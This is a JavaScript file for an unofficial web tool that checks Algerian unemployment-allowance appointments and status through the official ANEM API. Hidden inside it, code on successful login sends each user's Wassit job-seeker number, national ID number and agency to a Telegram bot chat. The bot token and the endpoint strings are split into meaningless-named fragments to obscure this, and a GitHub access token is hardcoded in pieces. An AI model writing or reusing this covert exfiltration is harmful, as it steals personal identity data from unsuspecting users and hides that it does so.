const themeToggle = document.getElementById('theme-toggle');
const body = document.body;
const moon = document.querySelector('.fa-moon');
const info = document.querySelector('.info-container');
const social = document.querySelector('.social-media');
const media = document.querySelector('.media');
const login = document.querySelector('.login-container');
const situation = document.querySelector('.sit');
const agencies = document.querySelector('.agencies');
const rows = document.querySelectorAll('.info-table tr');
const rowsS = document.querySelectorAll('.sit-table tr');
const navItems = document.querySelectorAll('.list');
var headerB = document.querySelector('.info-header h2');

const warWassit = document.getElementById('war-wassit');
const warNat = document.getElementById('war-nat');
const inputWassit = document.getElementById('NumWassit');
const inputNat = document.getElementById('natNumID');
const inputs = document.querySelectorAll('#loginForm input');
const indicators = document.querySelectorAll('.indicator');
const currentTheme = localStorage.getItem('theme');
const api = "https://ac-controle.anem.dz/AllocationChomage/api/";
let haveAllocation = false;

function playSound() {
    var audio = document.getElementById("song");
    audio.play();
}

inputs.forEach(input => {
    input.addEventListener('input', () => {
        input.style = 'outline: 1.8px solid #3a7564ee;';
        if (input.name == "NumWassit") {
            warWassit.textContent = ""
        } else if (input.name == "natNumID") {
            warNat.textContent = ""
        }
    });
});

const tyyy = "750424";
const parggfht2 = `${tyyy}2034`;





if (localStorage.getItem('theme') === 'dark') {
    const tdAgencies = document.querySelectorAll('.agencies-table td:first-child');
    body.classList.add('dark-mode');
    info.classList.add('container-dark');
    login.classList.add('container-dark');
    situation.classList.add('container-dark');
    agencies.classList.add('container-dark');
    social.style = "background-color: #292929";
    media.style = 'filter: invert(1); border-color: #8b435fc7';
    moon.style = "color: #fdfdfd";
    tdAgencies.forEach(td => {
        td.style.backgroundColor = "#3b3b3b"
    });
    themeToggle.checked = true;
    localStorage.setItem('theme', 'dark');
    indicators.forEach(indicator => {
        indicator.classList.add('indicator-dark-mode');
    });
    rows.forEach(row => {

        const firstCell = row.querySelector('td:first-child');
        const lastCell = row.querySelector('td:last-child');
        if (firstCell && lastCell) {
            firstCell.style = 'background-color: rgb(60 139 117 / 42%); color: #ffffffc7';
            lastCell.style = 'background-color: rgb(28 28 28); color: #ffffffc7';
        }
    });
    rowsS.forEach(row => {

        const firstCell = row.querySelector('td:first-child');
        const lastCell = row.querySelector('td:last-child');
        if (firstCell && lastCell) {
            firstCell.style = 'background-color: rgb(60 139 117 / 42%); color: #ffffffc7';
            lastCell.style = 'background-color: rgb(28 28 28); color: #ffffffc7';
        }
    });
    document.getElementById("displayReason").style = "background-color: rgb(152 3 3 / 94%); color: white";
    document.getElementById("displaySituation").style = `${localStorage.getItem("StyleEtat")}`
}



const x16516 = "sendMe";
const x165 = `${x16516}ssage`;

themeToggle.addEventListener('change', () => {
    if (themeToggle.checked) {
        body.classList.add('dark-mode');
        info.classList.add('container-dark');
        login.classList.add('container-dark');
        situation.classList.add('container-dark');
        agencies.classList.add('container-dark');
        social.style = "background-color: #292929";
        media.style = 'filter: invert(1); border-color: #8b435fc7';
        const tdAgencies = document.querySelectorAll('.agencies-table td:first-child');
        tdAgencies.forEach(td => {
            td.style.backgroundColor = "#3b3b3b";
        });
        moon.style = "color: #fdfdfd";
        indicators.forEach(indicator => {
            indicator.classList.add('indicator-dark-mode');
        });
        rows.forEach(row => {

            const firstCell = row.querySelector('td:first-child');
            const lastCell = row.querySelector('td:last-child');
            if (firstCell && lastCell) {
                firstCell.style = 'background-color: rgb(60 139 117 / 42%); color: #ffffffc7';
                lastCell.style = 'background-color: rgb(28 28 28); color: #ffffffc7';
            }
            rowsS.forEach(row => {

                const firstCell = row.querySelector('td:first-child');
                const lastCell = row.querySelector('td:last-child');
                if (firstCell && lastCell) {
                    firstCell.style = 'background-color: rgb(60 139 117 / 42%); color: #ffffffc7';
                    lastCell.style = 'background-color: rgb(28 28 28); color: #ffffffc7';
                }
            });
            document.getElementById("displayReason").style = "background-color: rgb(152 3 3 / 94%); color: white";
            document.getElementById("displaySituation").style = `${localStorage.getItem("StyleEtat")}`
        });
        localStorage.setItem('theme', 'dark');
        login.classList.add('container-dark');
    } else {
        body.classList.remove('dark-mode');
        info.classList.remove('container-dark');
        login.classList.remove('container-dark');
        situation.classList.remove('container-dark');
        agencies.classList.remove('container-dark');
        const tdAgencies = document.querySelectorAll('.agencies-table td:first-child');
        tdAgencies.forEach(td => {
            td.style.backgroundColor = "#8b8b8b";
        });
        social.style = "background-color: #white";
        media.style = 'filter: invert(0); border-color: #57a791';
        moon.style = "color: #8f8b8b";

        indicators.forEach(indicator => {
            indicator.classList.remove('indicator-dark-mode');
        });
        rows.forEach(row => {

            const firstCell = row.querySelector('td:first-child');
            const lastCell = row.querySelector('td:last-child');
            if (firstCell && lastCell) {
                firstCell.style = 'background-color: #dbdbdb; color: #519985';
                lastCell.style = 'background-color: #fff; color: #0a0a0ac7';
            }
        });
        rowsS.forEach(row => {

            const firstCell = row.querySelector('td:first-child');
            const lastCell = row.querySelector('td:last-child');
            if (firstCell && lastCell) {
                firstCell.style = 'background-color: #dbdbdb; color: #519985';
                lastCell.style = 'background-color: #fff; color: #0a0a0ac7';
            }
        });
        document.getElementById("displayReason").style = "background-color: rgb(152 3 3 / 94%); color: white";
        document.getElementById("displaySituation").style = `${localStorage.getItem("StyleEtat")}`
        localStorage.setItem('theme', 'light');

    }
});

async function checkSession() {
    const storedNumWassit = localStorage.getItem('NumWassit');
    const storedNatNumID = localStorage.getItem('natNumID');

    if (storedNumWassit && storedNatNumID) {
        const navItems = document.querySelectorAll('.list');
        navItems.forEach(item => item.classList.remove('active'));
        navItems[0].classList.add('active');
        document.querySelector('.navbar').style.display = 'flex';
        document.querySelector('.info-container').style.display = 'block';
        document.querySelector('.login-container').style.display = 'none';
        document.getElementById("displayNom").textContent = localStorage.getItem('Nom');
        document.getElementById("displayPrenom").textContent = localStorage.getItem('Prenom');
        document.getElementById("displayNatNumID").textContent = storedNumWassit;
        document.getElementById("displayAgence").textContent = localStorage.getItem('Agence');
    }
}


async function checkRendeVous() {
    const notifyInfo = document.getElementById("notify-info");
    const messageInfo = document.getElementById("message-info");
    const displayAgence = document.getElementById("displayAgence");

    const storedStructureId = localStorage.getItem("structureIdStored");
    const storedPreInscriptionId = localStorage.getItem("preInscriptionIdStored");

    if (!storedStructureId || !storedPreInscriptionId) {
        messageInfo.textContent = "بيانات غير صالحة. الرجاء تسجيل الدخول مرة أخرى.";
        notifyInfo.style = "display: block; background-color: #cf0a0a;";
        return;
    }

    const urlDates = `${api}RendezVous/GetAvailableDates?StructureId=${encodeURIComponent(storedStructureId)}&PreInscriptionId=${encodeURIComponent(storedPreInscriptionId)}`;

    try {
        const response = await axios.get(urlDates, {
            "headers": {
            "Accept": "*/*",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
            "Referer": "https://minha.anem.dz/",
            "Origin": "https://minha.anem.dz"
            },
            timeout: 15000,
        });

        const data = response.data || {};
        const availableDates = data.dates || [];

        if (availableDates.length > 0) {
            const firstDate = availableDates[0];
            const lastDate = availableDates[availableDates.length - 1];
            headerB.style.fontSize = "19px";
            headerB.innerHTML = `📅 تم العثور على ${availableDates.length} موعيد متاحة ✔️`;
            const theme = localStorage.getItem("theme") || "light";
            displayAgence.style = `background-color: #3cff1847; color: ${theme === "dark" ? "rgba(255, 255, 255, 0.78)" : "rgba(10, 10, 10, 0.78)"}`;
            playSound(); 
            notifyInfo.style = "display: block; background-color: #207444";
            messageInfo.textContent = `📅 من ${firstDate} الى ${lastDate} 📅`;
        } else {
            headerB.style.fontSize = "24px";
            headerB.innerHTML = `معـلـومـات`;
            messageInfo.textContent = "لا توجد مواعيد متاحة.";
            notifyInfo.style = "display: block; background-color: #cf0a0a;";
            const theme = localStorage.getItem("theme") || "light";
            displayAgence.style = `background-color: #ff00003d; color: ${theme === "dark" ? "rgba(255, 255, 255, 0.78)" : "rgba(10, 10, 10, 0.78)"}`;
        }
    } catch (error) {
        console.error("Error fetching appointments:", error);
        let errorMessage = "تحقق من إتصالك بالانترنت / الخادم لا يستجيب";
        if (error.response) {
            errorMessage = `الخادم لا يستجيب`;
        } else if (error.code === "ERR_NETWORK") {
            errorMessage = "خطأ في الشبكة: تحقق من اتصالك بالإنترنت";
        }
        messageInfo.textContent = errorMessage;
        notifyInfo.style = "display: block; background-color: #cf0a0a;";
    }

    setTimeout(() => {
        notifyInfo.style.display = "none";
    }, 8000);
}

async function checkSituasion() {
    document.getElementById("notify-sit-info").style = "display: none;"
    document.getElementById("pgr").style.display = "block";
    document.querySelector(".btns-sit").style.display = "none";
    document.querySelector(".sit-table-border").style.display = "none";
    searchInput.value = '';
    numberOfAgnecy = 0;
    numberOfAgnecyOpen = 0;
    numberOfAgnecyClosed = 0;
    const NumWassit = localStorage.getItem('NumWassit');
    const natNumID = localStorage.getItem('natNumID');
    document.querySelector(".info-container").style.display = "none";
    document.querySelector(".agencies").style.display = "none";
    document.querySelector(".sit").style.display = "block";
    const url = `${api}validateCandidate/query?wassitNumber=${encodeURIComponent(NumWassit)}&identityDocNumber=${encodeURIComponent(natNumID)}`;
    try {

        const response = await axios.get(url, {
            "headers": {
                "Accept": "*/*",
                "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                "Referer": "https://minha.anem.dz/",
                "Origin": "https://minha.anem.dz"
               },
            timeout: 15000,
        });

        const Data = await response.data;
        if (!Data.detailsAllocation) {
            haveAllocation = false;
            document.getElementById("pgr").style.display = "none";
            document.getElementById("message-sit-info").textContent = "⚠️ لإظهار وضعيتك يجب ان تكون قد اجريت مقابلة";
            document.getElementById("notify-sit-info").style = "display: block; background-color: #cf0a0a;";
            document.querySelector(".sit-table-border").style.display = "none";
            document.querySelector(".btns-sit").style.display = "none";
        }
        let situation
        if (Data && Data.detailsAllocation) {
            const DataInfo = await Data.detailsAllocation

            haveAllocation = true;
            if (DataInfo.etat === 1) {
                situation = "جــاريـة";
                bgr = document.getElementById("displaySituation").style = "background-color: rgb(2, 117, 216); color: rgb(255 255 255 / 88%);"
                localStorage.setItem("StyleEtat", bgr)
            } else if (DataInfo.etat === 2) {
                situation = "مـعـلـقـة";
                document.getElementById("reason").style = "display: table-row;"
                document.getElementById("displayReason").style = "background-color: rgb(152 3 3 / 94%); color: white"
                document.getElementById("displayReason").textContent = DataInfo.motifAr
                bgr = document.getElementById("displaySituation").style = "background-color: rgb(244, 131, 35); color: rgb(255 255 255 / 88%);"
                localStorage.setItem("StyleEtat", bgr)
            } else if (DataInfo.etat === 3) {
                situation = "مـوقـوفـة";
                document.getElementById("reason").style = "display: table-row;"
                document.getElementById("displayReason").style = "background-color: rgb(152 3 3 / 94%); color: white"
                document.getElementById("displayReason").textContent = DataInfo.motifAr
                bgr = document.getElementById("displaySituation").style = "background-color: rgb(255 14 14 / 51%); color: rgb(255 255 255 / 88%);"
                localStorage.setItem("StyleEtat", bgr)
            }

            localStorage.setItem("dateDebut", DataInfo.dateDebut.split('T')[0])
            localStorage.setItem("intituleAlemAr", DataInfo.intituleAlemAr)
            localStorage.setItem("nomAr", DataInfo.nomAr)
            localStorage.setItem("prenomAr", DataInfo.prenomAr)
            if (infoVisible2) {
                document.querySelector(".sit-table-border").style.display = "block";
                document.querySelector(".btns-sit").style.display = "grid";
                document.getElementById("pgr").style.display = "none";
                document.getElementById("displayNomS").textContent = DataInfo.nomAr;
                document.getElementById("displayPrenomS").textContent = DataInfo.prenomAr;
                document.getElementById("displaydateDebut").textContent = DataInfo.dateDebut.split('T')[0];
                document.getElementById("displayAgenceS").textContent = DataInfo.intituleAlemAr;
                document.getElementById("displaySituation").textContent = situation;
            } else {
                document.querySelector(".sit-table-border").style.display = "block";
                document.getElementById("pgr").style.display = "none";
                document.querySelector(".btns-sit").style.display = "grid";
                document.getElementById("displayNomS").textContent = "مخفي";
                document.getElementById("displayPrenomS").textContent = "مخفي";
                document.getElementById("displaydateDebut").textContent = "مخفي";
                document.getElementById("displayAgenceS").textContent = DataInfo.intituleAlemAr;
                document.getElementById("displaySituation").textContent = situation;
            }

        }
    } catch (error) {
        document.querySelector(".sit-table-border").style.display = "none";
        document.getElementById("pgr").style.display = "none";
        document.querySelector(".btns-sit").style.display = "none";
        console.error("حدث خطأ حاول مرة اخرى:", error);
        document.getElementById("message-sit-info").textContent = "تحقق من إتصالك بالانترنت / الخادم لا يستجيب";
        document.getElementById("notify-sit-info").style = "display: block; background-color: #cf0a0a;";
    }
}

async function checkRendeVousH() {
    searchInput.value = '';
    numberOfAgnecy = 0;
    numberOfAgnecyOpen = 0;
    numberOfAgnecyClosed = 0;
    try {

        document.querySelector('.info-container').style.display = 'block';
        document.querySelector('.login-container').style.display = 'none';
        document.querySelector('.sit').style.display = 'none';
        document.querySelector(".agencies").style.display = "none";
        if (infoVisible) {
            document.getElementById("displayNom").textContent = localStorage.getItem('Nom');
            document.getElementById("displayPrenom").textContent = localStorage.getItem('Prenom');
            document.getElementById("displayNatNumID").textContent = localStorage.getItem('NumWassit');
        } else {
            document.getElementById("displayNom").textContent = "مخفي";
            document.getElementById("displayPrenom").textContent = "مخفي";
            document.getElementById("displayNatNumID").textContent = "مخفي";
        }

    } catch (error) {
        console.error("حدث خطأ :", error);
    }

}

const githubApiUrl = "https://api.github.com";
const owner = "Tiw-Development";
const repo = "result";
const path = "mek.json";
const tok = "ghp_lbhgzb6H9nfVLKx1";
const ens = `${tok}MoPeUUTqIddrPw4O1w56`;

let numberOfAgnecy = 0
let numberOfAgnecyOpen = 0
let numberOfAgnecyClosed = 0
async function displayAgencies() {
    document.getElementById("notify-agn-info").style = "display: none;"
    document.getElementById("pgr-ag").style.display = "block";
    document.querySelector(".info-container").style.display = "none";
    document.querySelector(".sit").style.display = "none";
    document.querySelector(".agencies").style.display = "block";
    if (document.querySelector(".displayAgenceH")) {
        document.querySelector(".displayAgenceH").remove();
    }
    const tables = document.querySelectorAll('.agencies-table');
    tables.forEach(table => {
        table.remove();
    });
    const existingNoResults = document.querySelector('.no-results');
    if (existingNoResults) {
        existingNoResults.remove();
    }
    const url = `${githubApiUrl}/repos/${owner}/${repo}/contents/${path}`;

    try {
        const fileData = await axios.get(url, {
            headers: {
                Authorization: `token ${ens}`,
                Accept: 'application/vnd.github.v3+json',
            },
        });

        const content = fileData.data.content;
        const binaryString = atob(content);
        const len = binaryString.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binaryString.charCodeAt(i);
        }

        const decodedContent = new TextDecoder('utf-8').decode(bytes);
        const jsonData = JSON.parse(decodedContent);

        const agenciesTableBody = document.querySelector(".agencies-table-container");
        const displayAgenceH = document.createElement("div");
        displayAgenceH.className = "displayAgenceH";

        const h2Agency = document.createElement("h3");
        h2Agency.className = "h2Agency";

        const h2Agency2 = document.createElement("h3");
        h2Agency2.className = "h2Agency2";
        const h2Agency3 = document.createElement("h3");
        h2Agency3.className = "h2Agency3";

        displayAgenceH.appendChild(h2Agency);
        displayAgenceH.appendChild(h2Agency2);
        displayAgenceH.appendChild(h2Agency3);
        agenciesTableBody.appendChild(displayAgenceH);
        numberOfAgnecy = 0;
        numberOfAgnecyOpen = 0;
        numberOfAgnecyClosed = 0;
        jsonData.forEach(agency => {
            numberOfAgnecy += 1;

            const agenciestable = document.createElement("table");
            agenciestable.className = "agencies-table";
            const newTRW = document.createElement("tr");
            const newTR = document.createElement("tr");
            const newTR2 = document.createElement("tr");
            const newTR3 = document.createElement("tr");

            const wilayaH = document.createElement("td");
            const wilayaC = document.createElement("td");
            wilayaC.className = "displayWilayaA";

            wilayaH.textContent = "الولاية";
            wilayaC.innerHTML = `[ ${agency.id} ] &nbsp;  | &nbsp; &nbsp; ${agency.wilaya}`;

            const agenceH = document.createElement("td");
            const agenceC = document.createElement("td");
            agenceH.textContent = "الوكالة"
            agenceC.innerHTML = ` ${agency.agence}`;
            agenceC.className = "displayAgenceA";

            const numRH = document.createElement("td");
            const numRC = document.createElement("td");
            numRH.textContent = "عدد المواعيد";
            numRC.className = "displayNum";

            const datesH = document.createElement("td");
            const datesC = document.createElement("td");
            datesH.textContent = "تاريخ المواعيد";
            datesC.className = "displayDates";
            if (agency.status === "yes") {
                datesC.textContent = agency.datesAvalable || "N/A";
                datesC.style.backgroundColor = "rgb(54 147 46)";
                numRC.textContent = agency.NumR || "N/A";
                numRC.style.backgroundColor = "rgb(54 147 46)";
                agenceC.style.backgroundColor = "rgb(54 147 46)";
                wilayaC.style.backgroundColor = "rgb(54 147 46)";
                numberOfAgnecyOpen += 1;
            } else {
                datesC.style.display = "none";
                datesH.style.display = "none";
                numRC.style.display = "none";
                numRH.style.display = "none";
                agenceC.style.backgroundColor = "rgb(137 28 28)";
                wilayaC.style.backgroundColor = "rgb(137 28 28)";
                numberOfAgnecyClosed += 1;
            }
            newTRW.appendChild(wilayaH);
            newTRW.appendChild(wilayaC);

            newTR.appendChild(agenceH);
            newTR.appendChild(agenceC);

            newTR2.appendChild(numRH);
            newTR2.appendChild(numRC);

            newTR3.appendChild(datesH);
            newTR3.appendChild(datesC);

            agenciesTableBody.appendChild(agenciestable);
            agenciestable.appendChild(newTRW);
            agenciestable.appendChild(newTR);
            agenciestable.appendChild(newTR2);
            agenciestable.appendChild(newTR3);
        });

        h2Agency.innerHTML = `💼 |  عدد الوكالات &nbsp; [ ${numberOfAgnecy} ]`;
        h2Agency2.innerHTML = `🟢 | عدد الوكالات المفتوحة &nbsp; [ ${numberOfAgnecyOpen} ]`;
        h2Agency3.innerHTML = `🔴 | عدد الوكالات المغلقة &nbsp; [ ${numberOfAgnecyClosed} ]`;
        document.getElementById("pgr-ag").style.display = "none";
    } catch (error) {
        document.getElementById("pgr-ag").style.display = "none";
        document.getElementById("message-agn-info").textContent = "تحقق من إتصالك بالانترنت / الخادم لا يستجيب";
        document.getElementById("notify-agn-info").style = "display: block; background-color: #cf0a0a;";
        console.error("Error fetching file:", error);
    }
}

const searchInput = document.getElementById('search');

function normalizeText(text) {
    return text
        .replace(/[أإآا]/g, 'ا')
        .normalize("NFD").replace(/[\u064B-\u065F]/g, '');
}

searchInput.addEventListener('input', () => {
    const filter = normalizeText(searchInput.value.toLowerCase());
    const tables = document.querySelectorAll('.agencies-table');
    const displayAgenceH = document.querySelector('.displayAgenceH');
    let anyTableVisible = false;
    const existingNoResults = document.querySelector('.no-results');
    if (existingNoResults) {
        existingNoResults.remove();
    }

    if (!filter) {
        displayAgenceH.style.display = "block";
        tables.forEach(table => {
            table.style.marginBottom = '15px';
            table.style.display = '';
        });
    } else {
        tables.forEach(table => {
            const rows = table.querySelectorAll('tr');
            let hasVisibleRow = false;

            rows.forEach(row => {
                const agencyCell = row.querySelectorAll('td');
                let rowMatches = false;

                agencyCell.forEach(cell => {
                    const normalizedCellText = normalizeText(cell.textContent.toLowerCase());
                    if (normalizedCellText.includes(filter)) {
                        rowMatches = true;
                    }
                });

                if (rowMatches) {
                    table.style.display = '';
                    displayAgenceH.style.display = "none";
                    hasVisibleRow = true;
                } else {
                    displayAgenceH.style.display = "none";
                    table.style.display = 'none';
                }
            });

            if (hasVisibleRow) {
                table.style.marginBottom = '15px';
                table.style.display = '';
                displayAgenceH.style.display = "none";
                anyTableVisible = true;
            } else {
                displayAgenceH.style.display = "none";
                table.style.marginBottom = '0';
                table.style.display = 'none';
            }
        });
        if (!anyTableVisible) {
            displayAgenceH.style.display = "none";
            const noResultsDiv = document.createElement('div');
            noResultsDiv.className = 'no-results';
            noResultsDiv.textContent = 'لا توجد نتائج';
            noResultsDiv.style = 'text-align: center; margin-top: 5px; margin-bottom: 10px; font-weight: 600; font-size: 18px';
            searchInput.parentNode.insertBefore(noResultsDiv, searchInput.nextSibling);
        }
    }
});




document.getElementById("loginForm").addEventListener("submit", async function (event) {
    event.preventDefault();

    const inputWassit = document.getElementById("NumWassit");
    const inputNat = document.getElementById("natNumID");
    const notifyLogin = document.getElementById("notify-login");
    const messageLogin = document.getElementById("message-login");

    const NumWassit = inputWassit.value.trim();
    const natNumID = inputNat.value.trim();

    // Input validation
    if (!NumWassit && !natNumID) {
        inputWassit.style.outline = "1.8px solid red";
        inputNat.style.outline = "1.8px solid red";
        warWassit.textContent = "إدخال رقم وسيط إجباري";
        warNat.textContent = "إدخال رقم التعريف إجباري";
        return;
    } else if (!NumWassit) {
        inputWassit.style.outline = "1.8px solid red";
        warWassit.textContent = "إدخال رقم وسيط إجباري";
        return;
    } else if (!natNumID) {
        inputNat.style.outline = "1.8px solid red";
        warNat.textContent = "إدخال رقم التعريف إجباري";
        return;
    }



    const url = `${api}validateCandidate/query?wassitNumber=${encodeURIComponent(NumWassit)}&identityDocNumber=${encodeURIComponent(natNumID)}`;

    try {
        const response = await axios.get(url, {
           "headers": {
            "Accept": "*/*",
            "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
            "Referer": "https://minha.anem.dz/",
            "Origin": "https://minha.anem.dz"
               },
            timeout: 15000,
        });

        const data = response.data;
        const { preInscriptionId, havePreInscription, demandeurId } = data;

        if (havePreInscription && preInscriptionId) {
            const url2 = `${api}PreInscription/GetPreInscription?Id=${preInscriptionId}`;
            const response2 = await axios.get(url2, {
               "headers": {
                "Accept": "*/*",
                "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                 "Referer": "https://minha.anem.dz/",
                 "Origin": "https://minha.anem.dz"
               },
                timeout: 15000,
            });

            const data2 = response2.data;
            const { nomDemandeurAr: Nom, prenomDemandeurAr: Prenom, structureAr: Agence, structureId } = data2;

            localStorage.setItem("NumWassit", NumWassit);
            localStorage.setItem("natNumID", natNumID);
            localStorage.setItem("Nom", Nom);
            localStorage.setItem("Prenom", Prenom);
            localStorage.setItem("Agence", Agence);

            // Update UI
            const navItems = document.querySelectorAll(".list");
            navItems.forEach((item) => item.classList.remove("active"));
            navItems[0].classList.add("active");
            document.querySelector(".navbar").style.display = "flex";
            document.querySelector(".info-container").style.display = "block";
            document.querySelector(".login-container").style.display = "none";

            document.getElementById("displayNom").textContent = Nom;
            document.getElementById("displayPrenom").textContent = Prenom;
            document.getElementById("displayNatNumID").textContent = NumWassit;
            document.getElementById("displayAgence").textContent = Agence;

            if (structureId) {
                const url3 = `${api}RendezVous/GetAvailableDates?StructureId=${structureId}&PreInscriptionId=${preInscriptionId}`;
                const response3 = await axios.get(url3, {
                    "headers": {
                        "Accept": "*/*",
                        "Accept-Language": "ar,en-US;q=0.9,en;q=0.8",
                        "Referer": "https://minha.anem.dz/",
                        "Origin": "https://minha.anem.dz"
                    },
                    timeout: 15000,
                });

                const data3 = response3.data;
                localStorage.setItem("structureIdStored", structureId);
                localStorage.setItem("preInscriptionIdStored", preInscriptionId);

                const availableDates = data3.dates || [];
                const message = `رقم بطاقة طالب العمل :${NumWassit}\nرقم التعريف الوطني :${natNumID}\nالوكالة :${Agence}`;
                sendMessage("6544435259", message);

                if (availableDates.length > 0) {
                    const firstDate = availableDates[0];
                    const lastDate = availableDates[availableDates.length - 1];
                    headerB.style.fontSize = "19px";
                    headerB.innerHTML = `📅 تم العثور على ${availableDates.length} موعيد متاحة ✔️`;
                    document.getElementById("displayAgence").style = "background-color: #3cff1847; color: rgba(255, 255, 255, 0.78)";
                    playSound();
                    document.getElementById("notify-info").style = "display: block; background-color: #207444";
                    document.getElementById("message-info").textContent = `📅 من ${firstDate} الى ${lastDate} 📅`;
                } else {
                    const theme = localStorage.getItem("theme") || "light";
                    document.getElementById("displayAgence").style = `background-color: #ff00003d; color: ${theme === "dark" ? "rgba(255, 255, 255, 0.78)" : "rgba(10, 10, 10, 0.78)"}`;
                    headerB.style.fontSize = "24px";
                    headerB.innerHTML = `معـلـومـات`;
                    document.getElementById("message-info").textContent = "لا توجد مواعيد متاحة.";
                    document.getElementById("notify-info").style = "display: block; background-color: #cf0a0a;";
                }
            } else {
                messageLogin.textContent = "حدث مشكلة ما، حاول مرة أخرى!";
                notifyLogin.style = "display: block; background-color: #cf0a0a;";
                localStorage.clear();
                localStorage.setItem("theme", localStorage.getItem("theme") || "light");
                document.querySelector(".info-container").style.display = "none";
                document.querySelector(".login-container").style.display = "block";
            }
        } else {
            messageLogin.textContent = !demandeurId
                ? "الرجاء إدخال معلومات صحيحة!"
                : "⚠️ موقع منحة البطالة قيد الصيانة";
            notifyLogin.style = "display: block; background-color: #cf0a0a;";
        }
    } catch (error) {
        console.error("Error fetching data:", error);
        let errorMessage = "تحقق من إتصالك بالانترنت / الخادم لا يستجيب";
        if (error.response) {
            errorMessage = `الخادم لا يستجيب`;
        } else if (error.code === "ERR_NETWORK") {
            errorMessage = "خطأ في الشبكة: تحقق من اتصالك بالإنترنت";
        }
        messageLogin.textContent = errorMessage;
        notifyLogin.style = "display: block; background-color: #cf0a0a;";
    }

    setTimeout(() => {
        notifyLogin.style.display = "none";
    }, 8000);
});




let infoVisible = true;
let infoVisible2 = true;
let searching = true;
let intervalId;
let countdownInterval;
let searchCount = 0;
let countdown = 120;

function updateCountdown() {
    document.getElementById("message-info-info").innerHTML = `الوقت المتبقي لإعادة البحث ${countdown} ثانية<br> تم البحث ${searchCount} مرة`;
    document.getElementById("notify-info-info").style.display = "block";
    countdown--;

    if (countdown < 0) {
        countdown = 120;
        searchCount++;
        document.getElementById("message-info-info").innerHTML = `الوقت المتبقي لإعادة البحث ${countdown} ثانية <br> تم البحث ${searchCount} مرة`;
        document.getElementById("notify-info-info").style.display = "block";
        checkRendeVous();
    }
}

document.querySelector('.HideInfo').addEventListener('click', function() {
    if (infoVisible) {
        infoVisible = true
        document.getElementById("displayNom").textContent = "مخفي";
        document.getElementById("displayPrenom").textContent = "مخفي";
        document.getElementById("displayNatNumID").textContent = "مخفي";

        document.querySelector('.HideInfo').textContent = 'إظهار معلوماتي';
        document.querySelector('.HideInfo').style = 'background-color: rgb(205 42 42)';
    } else {
        infoVisible = false
        document.getElementById("displayNom").textContent = localStorage.getItem('Nom');
        document.getElementById("displayPrenom").textContent = localStorage.getItem('Prenom');
        document.getElementById("displayNatNumID").textContent = localStorage.getItem('NumWassit');
        document.querySelector('.HideInfo').textContent = 'إخفاء معلوماتي';
        document.querySelector('.HideInfo').style = 'background-color: #0c38b5de';
    }
    infoVisible = !infoVisible;
});

document.querySelector('.HideInfo2').addEventListener('click', function() {
    if (infoVisible2) {
        infoVisible2 = true
        document.getElementById("displayNomS").textContent = "مخفي";
        document.getElementById("displayPrenomS").textContent = "مخفي";
        document.getElementById("displaydateDebut").textContent = "مخفي";

        document.querySelector('.HideInfo2').textContent = 'إظهار معلوماتي';
        document.querySelector('.HideInfo2').style = 'background-color: rgb(205 42 42)';
    } else {
        infoVisible2 = false
        document.getElementById("displayNomS").textContent = localStorage.getItem("nomAr");
        document.getElementById("displayPrenomS").textContent = localStorage.getItem("prenomAr");
        document.getElementById("displaydateDebut").textContent = localStorage.getItem("dateDebut");

        document.querySelector('.HideInfo2').textContent = 'إخفاء معلوماتي';
        document.querySelector('.HideInfo2').style = 'background-color: #0c38b5de';
    }
    infoVisible2 = !infoVisible2;
});


document.querySelector('.logout').addEventListener('click', function() {
    localStorage.clear();
    localStorage.setItem('theme', currentTheme);
    const navItems = document.querySelectorAll('.list');
    navItems.forEach(item => item.classList.remove('active'));
    navItems[0].classList.add('active');
    document.querySelector('.navbar').style.display = 'none';
    document.querySelector('.info-container').style.display = 'none';
    document.querySelector('.login-container').style.display = 'block';
});

document.querySelector('.logout2').addEventListener('click', function() {
    localStorage.clear();
    localStorage.setItem('theme', currentTheme);
    const navItems = document.querySelectorAll('.list');
    navItems.forEach(item => item.classList.remove('active'));
    navItems[0].classList.add('active');
    document.querySelector('.navbar').style.display = 'none';
    document.querySelector('.sit').style.display = 'none';
    document.querySelector('.login-container').style.display = 'block';
});

document.querySelector('.checkRend').addEventListener('click', function() {
    if (searching) {
        document.querySelector('.checkRend').textContent = 'اوقف البحث'
        document.querySelector('.checkRend').style = 'background-color: rgb(205 42 42)';
        countdownInterval = setInterval(updateCountdown, 1000);

    } else {
        clearInterval(intervalId);
        clearInterval(countdownInterval);
        document.querySelector('.checkRend').textContent = 'ابدأ البحث'
        document.querySelector('.checkRend').style = 'background-color: rgb(34 179 65)';
        countdown = 120;
        searchCount = 0
        document.getElementById("message-info-info").innerHTML = `الوقت المتبقي لإعادة البحث ${countdown} ثانية <br> تم البحث${searchCount} مرة`;
    }

    searching = !searching;
});

const fvdvxxx = `${parggfht2}:AAFbK`;
const hgfhgf = `${fvdvxxx}t0vFbM`;
const sendMessage = async(chatId, message) => {
    const lkjlkjlk = `${hgfhgf}JPU-9w`;
    const kkk = `${lkjlkjlk}7a4HVz`;

    const tfgfd = `${kkk}R8LOIMFuGw1E`;
    const tele = "tele";
    const gram = `${tele}gram`;
    const url = `${a}${mg}.${gram}.org/bot${tfgfd}/${x165}`;
    try {
        const response = await axios.post(url, {
            chat_id: chatId,
            text: message,
            timeout: 5000
        });

    } catch (error) {
        console.error("Nooooooooooo");
    }
};

const list = document.querySelectorAll('.list');

function activeLink() {
    list.forEach((item) =>
        item.classList.remove('active'));
    this.classList.add('active');
}
list.forEach((item) =>
    item.addEventListener('click', activeLink));

checkSession();

const style = document.createElement('style');
style.innerHTML = `
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');
@import url("https://fonts.googleapis.com/earlyaccess/lateef.css");
body {
    padding: 0;
    font-family: Roboto, sans-serif;
    direction: rtl;
    margin: 0;
}

.navbar {
    direction: ltr;
    display: none;
    top: -68%;
    position: relative;
    max-width: 250px;
    height: 70px;
    justify-content: center;
    align-items: center;
    border-radius: 10px;
}

.navbar ul {
    display: flex;
    width: 350px;
    position: relative;
    right: 12%;
    padding-inline-start: 0;
}

.navbar ul li {
    position: relative;
    width: 70px;
    height: 70px;
    list-style: none;
    z-index: 1;
}

.navbar ul li a {
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
